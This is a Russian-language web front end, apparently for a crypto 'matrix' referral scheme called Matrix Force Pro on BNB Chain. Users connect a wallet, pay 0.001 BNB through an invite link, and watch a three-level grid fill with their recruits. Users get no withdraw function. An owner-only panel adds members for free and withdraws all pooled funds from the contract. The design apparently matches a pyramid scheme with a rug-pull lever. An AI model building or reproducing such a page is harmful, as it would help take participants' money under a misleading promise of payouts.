<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Matrix Force Pro</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <style>
        :root {
            --neon-blue: #00f2ff;
            --neon-purple: #bc13fe;
            --gold: #ffcc00;
            --dark-bg: #050508;
            --glass: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        body {
            background-color: var(--dark-bg);
            background-image: radial-gradient(circle at 50% 50%, #1a1a2e 0%, #050508 100%);
            color: #e0e0e0;
            font-family: 'Inter', -apple-system, sans-serif;
            margin: 0; padding: 20px;
            display: flex; flex-direction: column; align-items: center;
            min-height: 100vh;
        }

        .container { width: 100%; max-width: 440px; }

        .glass-card {
            background: var(--glass);
            backdrop-filter: blur(15px);
            border: 1px solid var(--glass-border);
            border-radius: 28px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        .header { text-align: center; margin-bottom: 30px; }
        .logo { 
            font-size: 1.8rem; font-weight: 900; 
            background: linear-gradient(90deg, var(--neon-blue), var(--neon-purple));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            text-transform: uppercase; letter-spacing: 3px;
        }

        .status-tag {
            display: inline-block; padding: 5px 12px; border-radius: 50px;
            font-size: 0.7rem; font-weight: bold; text-transform: uppercase;
            margin-bottom: 10px; border: 1px solid currentColor;
        }

        .btn {
            width: 100%; padding: 18px; border-radius: 18px; border: none;
            font-weight: 800; font-size: 1rem; cursor: pointer; transition: 0.4s;
            text-transform: uppercase; letter-spacing: 1px;
        }
        .btn-main { background: linear-gradient(135deg, var(--neon-blue), var(--neon-purple)); color: #fff; box-shadow: 0 0 20px rgba(0, 242, 255, 0.3); }
        .btn-main:hover { transform: translateY(-2px); box-shadow: 0 0 30px rgba(188, 19, 254, 0.5); }
        .btn-outline { background: transparent; border: 1px solid var(--glass-border); color: #fff; }

        .matrix-title { font-size: 0.8rem; color: #888; margin-bottom: 15px; display: flex; justify-content: space-between; }
        .dots-container { display: flex; flex-wrap: wrap; gap: 12px; justify-content: center; padding: 10px 0; }
        .dot { width: 30px; height: 30px; border-radius: 50%; background: #151520; border: 1px solid #252535; transition: 0.5s; }
        
        .active-lvl1 { background: var(--neon-blue); box-shadow: 0 0 15px var(--neon-blue); }
        .active-lvl2 { background: var(--neon-purple); box-shadow: 0 0 15px var(--neon-purple); }
        .active-lvl3 { 
            background: var(--gold); border-radius: 8px; 
            box-shadow: 0 0 20px var(--gold); 
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        input {
            width: 100%; padding: 15px; background: rgba(0,0,0,0.3);
            border: 1px solid var(--glass-border); border-radius: 14px;
            color: #fff; margin: 10px 0; box-sizing: border-box; font-family: 'Courier New', monospace;
        }

        .hidden { display: none; }
        .admin-panel { border: 1px solid var(--gold); background: rgba(255, 204, 0, 0.05); }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <div class="logo">Matrix Force</div>
        <div id="walletInfo" class="status-tag" style="color: var(--neon-blue); margin-top: 10px; display: none;">Connected</div>
    </div>

    <div id="connectBox" class="glass-card" style="text-align: center;">
        <h2>Добро пожаловать</h2>
        <p style="color: #888;">Для входа в систему подключите свой крипто-кошелек</p>
        <button class="btn btn-main" onclick="connect()">Подключить Wallet</button>
    </div>

    <div id="regBox" class="glass-card hidden">
        <div class="status-tag" style="color: #ff4444;">Активация не выполнена</div>
        <h3>Регистрация</h3>
        <p style="font-size: 0.8rem; color: #888;">Вход только по пригласительной ссылке.<br>Стоимость: 0.001 BNB</p>
        <label style="font-size: 0.7rem; color: var(--neon-blue);">ВАШ ПРИГЛАСИТЕЛЬ:</label>
        <input type="text" id="refInput" readonly>
        <button class="btn btn-main" onclick="register()">Оплатить 0.001 BNB</button>
    </div>

    <div id="dashboard" class="hidden">
        
        <div class="glass-card">
            <div class="matrix-title"><span>ВАШ КУРАТОР:</span> <span id="curatorAddr" style="color: #fff;">-</span></div>
            <div class="matrix-title"><span>БАЛАНС (LVL 1-2):</span> <span id="userBalance" style="color: var(--neon-blue);">0.00 BNB</span></div>
        </div>

        <div class="glass-card">
            <div class="matrix-title" style="color: var(--neon-blue);">УРОВЕНЬ 1 (2 слота) <span id="l1-stat">0/2</span></div>
            <div id="grid1" class="dots-container"></div>
            
            <div style="height: 1px; background: var(--glass-border); margin: 20px 0;"></div>

            <div class="matrix-title" style="color: var(--neon-purple);">УРОВЕНЬ 2 (6 слотов) <span id="l2-stat">0/6</span></div>
            <div id="grid2" class="dots-container"></div>

            <div style="height: 1px; background: var(--glass-border); margin: 20px 0;"></div>

            <div class="matrix-title" style="color: var(--gold);">УРОВЕНЬ 3 - ПРЯМЫЕ ВЫПЛАТЫ <span id="l3-stat">★</span></div>
            <div id="grid3" class="dots-container"></div>
        </div>

        <div class="glass-card">
            <p style="font-size: 0.8rem; margin-bottom: 10px;">Ваша партнерская ссылка:</p>
            <input type="text" id="refLink" readonly>
            <button class="btn btn-outline" onclick="copyLink()">Копировать ссылку</button>
            <p id="limitText" style="color: #ff4444; font-size: 0.7rem; margin-top: 10px; display: none; text-align: center;">ЛИМИТ ПРИГЛАШЕНИЙ ИСЧЕРПАН (2/2)</p>
        </div>
    </div>

    <div id="adminPanel" class="glass-card admin-panel hidden">
        <h4 style="margin: 0 0 15px 0; color: var(--gold);">ADMIN CONTROL</h4>
        <div class="matrix-title"><span>БАЛАНС ПРОЕКТА:</span> <span id="contractBalance" style="color: #fff; font-weight: bold;">0.00 BNB</span></div>
        
        <div style="margin-bottom: 20px;">
            <p style="font-size: 0.7rem; color: #888; margin-bottom: 5px;">Бесплатное добавление:</p>
            <input type="text" id="adminNewUser" placeholder="Кошелек нового участника">
            <input type="text" id="adminNewRef" placeholder="Кошелек его куратора">
            <button class="btn" style="background: var(--gold); color: #000; padding: 12px; font-size: 0.8rem;" onclick="adminAddUser()">Добавить в структуру</button>
        </div>

        <div style="border-top: 1px solid rgba(255,204,0,0.2); pt: 15px;">
            <p style="font-size: 0.7rem; color: #888; margin-bottom: 5px;">Управление финансами:</p>
            <button class="btn" style="background: transparent; border: 1px solid var(--gold); color: var(--gold); padding: 12px; font-size: 0.8rem;" onclick="adminWithdraw()">Вывести все средства</button>
        </div>
    </div>
</div>

<script>
    const CONTRACT_ADDR = "0x2c4326c0577e8Ef8679B302eAd3603Df8224B7ed";
    const ABI = [
        {"inputs":[{"internalType":"address","name":"_referrer","type":"address"}],"name":"register","outputs":[],"stateMutability":"payable","type":"function"},
        {"inputs":[{"internalType":"address","name":"_user","type":"address"},{"internalType":"address","name":"_ref","type":"address"}],"name":"adminAddUser","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
        {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"users","outputs":[{"internalType":"uint256","name":"level","type":"uint256"},{"internalType":"address","name":"referrer","type":"address"},{"internalType":"uint256","name":"partnersCount","type":"uint256"},{"internalType":"uint256","name":"structureCount","type":"uint256"},{"internalType":"uint256","name":"internalBalance","type":"uint256"},{"internalType":"bool","name":"exists","type":"bool"}],"stateMutability":"view","type":"function"}
    ];

    let web3, contract, userAddr;

    function buildGrids() {
        const createDots = (id, count) => {
            const container = document.getElementById(id);
            container.innerHTML = ''; 
            for(let i=0; i<count; i++) container.innerHTML += '<div class="dot"></div>';
        }
        createDots('grid1', 2);
        createDots('grid2', 6);
        createDots('grid3', 14);
    }
    buildGrids();

    async function connect() {
        if (window.ethereum) {
            web3 = new Web3(window.ethereum);
            try {
                const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAddr = accs[0];
                contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
                
                document.getElementById('connectBox').classList.add('hidden');
                document.getElementById('walletInfo').style.display = 'inline-block';
                document.getElementById('walletInfo').innerText = userAddr.slice(0,6) + '...' + userAddr.slice(-4);
                
                checkStatus();
            } catch (e) { console.error("User denied account access"); }
        } else { alert("Нужен MetaMask!"); }
    }

    async function checkStatus() {
        const user = await contract.methods.users(userAddr).call();
        const owner = await contract.methods.owner().call();

        // Показ админки и баланса контракта
        if (userAddr.toLowerCase() === owner.toLowerCase()) {
            document.getElementById('adminPanel').classList.remove('hidden');
            updateContractBalance();
        }

        if (user.exists) {
            document.getElementById('regBox').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            
            document.getElementById('curatorAddr').innerText = user.referrer.slice(0,8) + "...";
            document.getElementById('userBalance').innerText = web3.utils.fromWei(user.internalBalance, 'ether') + " BNB";

            if (parseInt(user.partnersCount) >= 2) {
                document.getElementById('refLink').value = "ЛИМИТ 2/2 ИСЧЕРПАН";
                document.getElementById('limitText').style.display = 'block';
            } else {
                document.getElementById('refLink').value = window.location.origin + window.location.pathname + "?ref=" + userAddr;
            }

            const total = parseInt(user.structureCount);
            const allDots = document.querySelectorAll('.dot');
            allDots.forEach(d => d.className = 'dot'); // Сброс
            for(let i=0; i<total; i++) {
                if(i < 2) allDots[i].classList.add('active-lvl1');
                else if(i < 8) allDots[i].classList.add('active-lvl2');
                else if(i < 22) allDots[i].classList.add('active-lvl3');
            }
            document.getElementById('l1-stat').innerText = (total > 2 ? 2 : total) + "/2";
            document.getElementById('l2-stat').innerText = (total > 8 ? 6 : (total > 2 ? total-2 : 0)) + "/6";

        } else {
            document.getElementById('regBox').classList.remove('hidden');
            document.getElementById('dashboard').classList.add('hidden');
            const urlParams = new URLSearchParams(window.location.search);
            document.getElementById('refInput').value = urlParams.get('ref') || "0x000... (Прямой вход)";
        }
    }

    async function updateContractBalance() {
        const b = await web3.eth.getBalance(CONTRACT_ADDR);
        document.getElementById('contractBalance').innerText = web3.utils.fromWei(b, 'ether') + " BNB";
    }

    async function register() {
        const ref = new URLSearchParams(window.location.search).get('ref') || "0x0000000000000000000000000000000000000000";
        try {
            await contract.methods.register(ref).send({ from: userAddr, value: web3.utils.toWei('0.001', 'ether') });
            location.reload();
        } catch(e) { console.error(e); }
    }

    async function adminAddUser() {
        const target = document.getElementById('adminNewUser').value;
        const ref = document.getElementById('adminNewRef').value;
        if(!web3.utils.isAddress(target) || !web3.utils.isAddress(ref)) return alert("Неверные адреса!");
        try {
            await contract.methods.adminAddUser(target, ref).send({ from: userAddr });
            alert("Участник успешно добавлен!");
            checkStatus();
        } catch(e) { alert("Ошибка: только админ или неверные данные"); }
    }

    async function adminWithdraw() {
        try {
            await contract.methods.withdraw().send({ from: userAddr });
            alert("Вывод средств выполнен!");
            updateContractBalance();
        } catch(e) { 
            console.error(e);
            alert("Ошибка вывода. Убедитесь, что в смарте есть функция withdraw и вы владелец."); 
        }
    }

    function copyLink() {
        const el = document.getElementById('refLink');
        if (el.value.includes("ЛИМИТ")) return;
        el.select();
        navigator.clipboard.writeText(el.value);
        alert("Ссылка скопирована!");
    }
</script>
</body>
    </html>
    
